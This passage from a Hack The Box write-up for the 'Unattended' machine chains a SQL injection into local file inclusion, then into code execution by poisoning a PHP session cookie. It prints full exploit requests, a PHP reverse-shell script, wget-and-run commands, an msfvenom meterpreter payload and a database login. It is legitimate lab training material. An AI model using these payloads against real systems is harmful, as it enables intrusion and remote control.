&lt;h4 id=&quot;the-sql-injectable-query-we-just-exploited-is-part-of-the-function-gettplfromid-which-returns-the-page-name-after-querying-it-from-the-table-idname-based-on-our-given-id-number-&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; injectable query we just exploited is part of the function &lt;code class=&quot;highlighter-rouge&quot;&gt;getTplFromID&lt;/code&gt; which returns the page name after querying it from the table &lt;code class=&quot;highlighter-rouge&quot;&gt;idname&lt;/code&gt; based on our given id number :&lt;/h4&gt;
&lt;h4 id=&quot;function-gettplfromid-&quot;&gt;Function &lt;code class=&quot;highlighter-rouge&quot;&gt;getTplFromID()&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function getTplFromID($conn) {
	global $debug;
	$valid_ids = array (25,465,587);
	if ( (array_key_exists('id', $_GET)) &amp;amp;&amp;amp; (intval($_GET['id']) == $_GET['id']) &amp;amp;&amp;amp; (in_array(intval($_GET['id']),$valid_ids)) ) {
			$sql = &quot;SELECT name FROM idname where id = '&quot;.$_GET['id'].&quot;'&quot;;
	} else {
		$sql = &quot;SELECT name FROM idname where id = '25'&quot;;
	}
	if ($debug) { echo &quot;sqltpl: $sql&amp;lt;br&amp;gt;\n&quot;; } 
	
	$result = $conn-&amp;gt;query($sql);
	if ($result-&amp;gt;num_rows &amp;gt; 0) {
	while($row = $result-&amp;gt;fetch_assoc()) {
		$ret = $row['name'];
	}
	} else {
		$ret = 'main';
	}
	if ($debug) { echo &quot;rettpl: $ret&amp;lt;br&amp;gt;\n&quot;; }
	return $ret;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;table-idname-&quot;&gt;Table &lt;code class=&quot;highlighter-rouge&quot;&gt;idname&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+-----+-------------+----------+
| id  | name        | disabled |
+-----+-------------+----------+
| 1   | main.php    | 1        |
| 2   | about.php   | 1        |
| 3   | contact.php | 1        |
| 25  | main        | 0        |
| 465 | about       | 0        |
| 587 | contact     | 0        |
+-----+-------------+----------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;there-is-another-function-called-getpathfromtpl-which-takes-the-returned-page-name-and-queries-the-actual-path-from-the-table-filepath-then-returns-it-&quot;&gt;There is another function called &lt;code class=&quot;highlighter-rouge&quot;&gt;getPathFromTpl&lt;/code&gt; which takes the returned page name and queries the actual path from the table &lt;code class=&quot;highlighter-rouge&quot;&gt;filepath&lt;/code&gt; then returns it :&lt;/h4&gt;
&lt;h4 id=&quot;function-getpathfromtpl-&quot;&gt;Function &lt;code class=&quot;highlighter-rouge&quot;&gt;getPathFromTpl()&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function getPathFromTpl($conn,$tpl) {
	global $debug;
	$sql = &quot;SELECT path from filepath where name = '&quot;.$tpl.&quot;'&quot;;
	if ($debug) { echo &quot;sqlpath: $sql&amp;lt;br&amp;gt;\n&quot;; }
	$result = $conn-&amp;gt;query($sql);
	if ($result-&amp;gt;num_rows &amp;gt; 0) {
		while($row = $result-&amp;gt;fetch_assoc()) {
			$ret = $row['path'];
		}
	}
	if ($debug) { echo &quot;retpath: $ret&amp;lt;br&amp;gt;\n&quot;; }
	return $ret;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;table-filepath-&quot;&gt;Table &lt;code class=&quot;highlighter-rouge&quot;&gt;filepath&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+---------+--------------------------------------+
| name    | path                                 |
+---------+--------------------------------------+
| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |
| contact | 0f710bba8d16303a415266af8bb52fcb.php |
| main    | 787c75233b93aa5e45c3f85d130bfbe7.php |
+---------+--------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-first-function-gets-called-and-its-return-value-gets-saved-in-the-variable-tpl--tpl--gettplfromidconn&quot;&gt;The first function gets called and its return value gets saved in the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;tpl&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;$tpl = getTplFromID($conn);&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-the-second-function-gets-called-with-the-variable-tpl-and-its-return-value-gets-saved-in-the-variable-inc&quot;&gt;Then the second function gets called with the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;tpl&lt;/code&gt; and its return value gets saved in the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;inc&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;and-finally-it-includes-that-page-includeinc&quot;&gt;And finally it includes that page &lt;code class=&quot;highlighter-rouge&quot;&gt;include(&quot;$inc&quot;);&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-have-a-sql-injection-vulnerability-which-we-can-use-to-control-whats-being-included-in-other-words-we-have-a-local-file-inclusion-vulnerability&quot;&gt;We have a &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; injection vulnerability which we can use to control what’s being included, in other words we have a local file inclusion vulnerability.&lt;/h4&gt;
&lt;h4 id=&quot;after-some-attempts-to-read-etcpasswd-this-payload-worked---union-select-main-union-select-etcpasswd-----&quot;&gt;After some attempts to read &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; this payload worked : &lt;code class=&quot;highlighter-rouge&quot;&gt;' UNION SELECT &quot;main' UNION SELECT '/etc/passwd';-- &quot;;--&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/15.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;lfi-to-rce&quot;&gt;LFI to RCE&lt;/h3&gt;
&lt;h4 id=&quot;we-need-to-get-rce-from-this-lfi-if-i-could-include-my-session-file-varlibphpsessionsess_session-cookie-then-i-could-put-php-code-in-a-cookie-and-include-it-my-session-cookie-was-c5vmccsqkle2rdionj28kit221&quot;&gt;We need to get &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; from this &lt;code class=&quot;highlighter-rouge&quot;&gt;LFI&lt;/code&gt;. If I could include my session file (&lt;code class=&quot;highlighter-rouge&quot;&gt;/var/lib/php/session/sess_[SESSION COOKIE]&lt;/code&gt;) then I could put &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; code in a cookie and include it. My session cookie was &lt;code class=&quot;highlighter-rouge&quot;&gt;c5vmccsqkle2rdionj28kit221&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;request-&quot;&gt;Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
Host: www.nestedflanders.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=c5vmccsqkle2rdionj28kit221;
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Fri, 23 Aug 2019 16:25:24 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 935
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
X-Upstream: 127.0.0.1:8080

&amp;lt;!DOCTYPE html&amp;gt;
----------------
 Removed Output
----------------
&amp;lt;!-- &amp;lt;div align=&quot;center&quot;&amp;gt; --&amp;gt;
PHPSESSID|s:26:&quot;c5vmccsqkle2rdionj28kit221&quot;;
&amp;lt;!-- &amp;lt;/div&amp;gt; --&amp;gt;

&amp;lt;/div&amp;gt; &amp;lt;!-- row --&amp;gt;
&amp;lt;/div&amp;gt; &amp;lt;!-- container --&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-worked-i-created-a-cookie-and-called-it-rce-any-php-code-i-put-there-will-be-included-and-executed-so-we-can-get-rce-by-system-or-passthru-lets-try-whoami-&quot;&gt;It worked, I created a cookie and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;, any &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; code I put there will be included and executed so we can get &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; by &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;passthru()&lt;/code&gt;, let’s try &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; :&lt;/h4&gt;
&lt;h4 id=&quot;request--1&quot;&gt;Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
Host: www.nestedflanders.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&amp;lt;?php passthru('whoami')?&amp;gt;;
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--1&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Fri, 23 Aug 2019 16:25:45 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 955
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
X-Upstream: 127.0.0.1:8080

&amp;lt;!DOCTYPE html&amp;gt;
----------------
 Removed Output
----------------
&amp;lt;!-- &amp;lt;div align=&quot;center&quot;&amp;gt; --&amp;gt;
PHPSESSID|s:26:&quot;c5vmccsqkle2rdionj28kit221&quot;;RCE|s:26:&quot;www-data
&quot;;&amp;lt;!-- &amp;lt;/div&amp;gt; --&amp;gt;

&amp;lt;/div&amp;gt; &amp;lt;!-- row --&amp;gt;
&amp;lt;/div&amp;gt; &amp;lt;!-- container --&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-spent-a-lot-of-time-trying-to-get-a-reverse-shell-and-i-couldnt-so-i-checked-iptables-rules-&quot;&gt;I spent a lot of time trying to get a reverse shell and I couldn’t, so I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;iptables&lt;/code&gt; rules :&lt;/h4&gt;
&lt;h4 id=&quot;request--2&quot;&gt;Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
Host: www.nestedflanders.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&amp;lt;?php passthru('cat /etc/iptables/rules.v4')?&amp;gt;;
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--2&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Fri, 23 Aug 2019 16:27:11 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1592
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
X-Upstream: 127.0.0.1:8080

&amp;lt;!DOCTYPE html&amp;gt;
----------------
 Removed Output
----------------
&amp;lt;!-- &amp;lt;div align=&quot;center&quot;&amp;gt; --&amp;gt;
PHPSESSID|s:26:&quot;c5vmccsqkle2rdionj28kit221&quot;;RCE|s:46:&quot;# Generated by iptables-save v1.6.0 on Wed Dec 19 21:55:49 2018
*filter
:INPUT DROP [7:1813]
:FORWARD ACCEPT [0:0]
:OUTPUT DROP [34:2661]
-A INPUT -i lo -j ACCEPT
-A INPUT -i ens33 -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -i ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT
-A INPUT -i ens33 -p icmp -j ACCEPT
-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -j DROP
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -o ens33 -m state --state RELATED,ESTABLISHED -j ACCEPT
-A OUTPUT -o ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT
-A OUTPUT -o ens33 -p icmp -j ACCEPT
COMMIT
# Completed on Wed Dec 19 21:55:49 2018
&quot;;&amp;lt;!-- &amp;lt;/div&amp;gt; --&amp;gt;

&amp;lt;/div&amp;gt; &amp;lt;!-- row --&amp;gt;
&amp;lt;/div&amp;gt; &amp;lt;!-- container --&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-only-get-a-reverse-shell-on-ports-443-and-80-my-problem-was-trying-to-get-a-connection-on-port-1337&quot;&gt;We can only get a reverse shell on ports 443 and 80. My problem was trying to get a connection on port 1337.&lt;/h4&gt;
&lt;h4 id=&quot;nc-wasnt-on-the-box-so-i-used-php-to-get-a-reverse-shell&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; wasn’t on the box so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; to get a reverse shell.&lt;/h4&gt;
&lt;h4 id=&quot;shellsh-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
php &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$sock=fsockopen(&quot;10.10.xx.xx&quot;,443);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-started-a-python-server-on-port-80-then-i-downloaded-the-shell-file-on-the-box-and-executed-it-&quot;&gt;I started a python server on port 80 then I downloaded the shell file on the box and executed it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
Host: www.nestedflanders.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&amp;lt;?php passthru('cd /tmp &amp;amp;&amp;amp; wget http://10.10.xx.xx/shell.sh')?&amp;gt;;
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
Host: www.nestedflanders.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&amp;lt;?php passthru('cd /tmp &amp;amp;&amp;amp; sh shell.sh')?&amp;gt;;
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-we-get-a-shell-as-www-data-&quot;&gt;And we get a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-i-didnt-like-2-things-about-this-shell-first-thing-it-wasnt-a-tty-shell-second-thing-with-only-2-ports-available-it-was-annoying-because-i-usually-need-more-shells-so-i-created-a-php-meterpreter-payload-because-with-meterpreter-i-can-spawn-as-many-shells-as-i-want-and-they-can-be-tty-shells&quot;&gt;But I didn’t like 2 things about this shell. First thing, it wasn’t a tty shell. Second thing, with only 2 ports available It was annoying because I usually need more shells. So I created a &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; payload because with &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; I can spawn as many shells as I want and they can be tty shells.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/unattended# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=80 &amp;gt; shell.php                                                                                          
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1110 bytes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cd /tmp
$ wget http://10.10.xx.xx/shell.php
--2019-08-23 13:09:38--  http://10.10.xx.xx/shell.php
Connecting to 10.10.xx.xx:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1110 (1.1K) [application/octet-stream]
Saving to: 'shell.php'

     0K .                                                     100% 92.4M=0s

2019-08-23 13:09:39 (92.4 MB/s) - 'shell.php' saved [1110/1110]

$ php ./shell.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use multi/handler
set msf5 exploit(multi/handler) &amp;gt; set payload php/meterpreter/reverse_tcp
payload =&amp;gt; php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &amp;gt; set LHOST 10.10.xx.xx
LHOST =&amp;gt; 10.10.xx.xx
msf5 exploit(multi/handler) &amp;gt; set LPORT 80
LPORT =&amp;gt; 80
msf5 exploit(multi/handler) &amp;gt; run

[*] Started reverse TCP handler on 10.10.xx.xx:80
[*] Sending stage (38247 bytes) to 10.10.10.126
[*] Meterpreter session 1 opened (10.10.xx.xx:80 -&amp;gt; 10.10.10.126:47866) at 2019-08-23 19:09:59 +0200

meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;note--i-stopped-the-python-server-before-starting-the-listener-because-both-of-them-use-port-80&quot;&gt;Note : I stopped the python server before starting the listener because both of them use port 80.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;shell-as-guly-user-flag&quot;&gt;Shell as guly, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;there-is-only-one-user-on-the-box--guly-and-we-cant-access-the-home-directory-&quot;&gt;There is only one user on the box : &lt;code class=&quot;highlighter-rouge&quot;&gt;guly&lt;/code&gt;, and we can’t access the home directory :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@unattended:/tmp$ ls -la /home     
ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Dec 20  2018 .
drwxr-xr-x 22 root root 4096 Dec 21  2018 ..
drwxr-x---  2 guly guly 4096 Apr  2 17:11 guly
www-data@unattended:/tmp$ cd /home/guly
cd /home/guly
bash: cd: /home/guly: Permission denied
www-data@unattended:/tmp$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;earlier-we-got-the-database-credentials-from-indexphp-and-we-couldnt-dump-the-whole-database-because-of-the-slow-process-lets-check-the-database-&quot;&gt;Earlier we got the database credentials from &lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt; and we couldn’t dump the whole database because of the slow process, let’s check the database :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@unattended:/tmp$ mysql -h localhost -u nestedflanders -p
mysql -h localhost -u nestedflanders -p
Enter password: 1036913cf7d38d4ea4f79b050f171e9fbf3f5e

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 14511
Server version: 10.1.37-MariaDB-0+deb9u1 Debian 9.6

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MariaDB [(none)]&amp;gt; use neddy;
use neddy;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [neddy]&amp;gt; show tables;
show tables;
+-----------------+
| Tables_in_neddy |
+-----------------+
| config          |
| customers       |
| employees       |
| filepath        |
| idname          |
| offices         |
| orderdetails    |
| orders          |
| payments        |
| productlines    |
| products        |
+-----------------+
11 rows in set (0.00 sec)

MariaDB [neddy]&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;config-looks-interesting-lets-check-it-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;config&lt;/code&gt; looks interesting, let’s check it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MariaDB [neddy]&amp;gt; select * from config;                                                                                                                                                                             
select * from config;

+-----+-------------------------+--------------------------------------------------------------------------+         
| id  | option_name             | option_value                                                             |           
+-----+-------------------------+--------------------------------------------------------------------------+          
|  54 | offline                 | 0                                                                        |          
|  55 | offline_message         | Site offline, please come back later                                     |           
|  56 | display_offline_message | 0                                                                        |          
|  57 | offline_image           |                                                                          |         
|  58 | sitename                | NestedFlanders                                                           |          
|  59 | editor                  | tinymce                                                                  |         
|  60 | captcha                 | 0                                                                        |         
|  61 | list_limit              | 20                                                                       |          
|  62 | access                  | 1                                                                        |         
|  63 | debug                   | 0                                                                        |         
|  64 | debug_lang              | 0                                                                        |          
|  65 | dbtype                  | mysqli                                                                   |         
|  66 | host                    | localhost                                                                |          
|  67 | live_site               |                                                                          |          
|  68 | gzip                    | 0                                                                        |         
|  69 | error_reporting         | default                                                                  |         
|  70 | ftp_host                | 127.0.0.1                                                                |          
|  71 | ftp_port                | 21                                                                       |          
|  72 | ftp_user                | flanders                                                                 |
|  73 | ftp_pass                | 0e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466 |       
|  74 | ftp_root                | /                                                                        |         
|  75 | ftp_enable              | 1                                                                        |         
|  76 | offset                  | UTC                                                                      |         
|  77 | mailonline              | 1                                                                        |          
|  78 | mailer                  | mail                                                                     |          
|  79 | mailfrom                | nested@nestedflanders.htb                                                |         
|  80 | fromname                | Neddy                                                                    |         
|  81 | sendmail                | /usr/sbin/sendmail                                                       |          
|  82 | smtpauth                | 0                                                                        |         
|  83 | smtpuser                |                                                                          |         
|  84 | smtppass                |                                                                          |         
|  85 | smtppass                |                                                                          |         
|  86 | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;                      |          
|  87 | smtphost                | localhost                                                                |
|  88 | smtpsecure              | none                                                                     |
|  89 | smtpport                | 25                                                                       |
|  90 | caching                 | 0                                                                        |
|  91 | cache_handler           | file                                                                     |
|  92 | cachetime               | 15                                                                       |
|  93 | MetaDesc                |                                                                          |
|  94 | MetaKeys                |                                                                          |
|  95 | MetaTitle               | 1                                                                        |
|  96 | MetaAuthor              | 1                                                                        |
|  97 | MetaVersion             | 0                                                                        |
|  98 | robots                  |                                                                          |
|  99 | sef                     | 1                                                                        |
| 100 | sef_rewrite             | 0                                                                        |
| 101 | sef_suffix              | 0                                                                        |
| 102 | unicodeslugs            | 0                                                                        |          
| 103 | feed_limit              | 10                                                                       |         
| 104 | lifetime                | 1                                                                        |          
| 105 | session_handler         | file                                                                     |         
+-----+-------------------------+--------------------------------------------------------------------------+                                                                                                      
52 rows in set (0.00 sec)

MariaDB [neddy]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-row-with-id-86-looks-interesting-it-has-a-value-of-some-perl-scripts-&quot;&gt;The row with id 86 looks interesting. It has a value of some &lt;code class=&quot;highlighter-rouge&quot;&gt;perl&lt;/code&gt; scripts :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/home/guly/checkbase.pl;/home/guly/checkplugins.pl;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
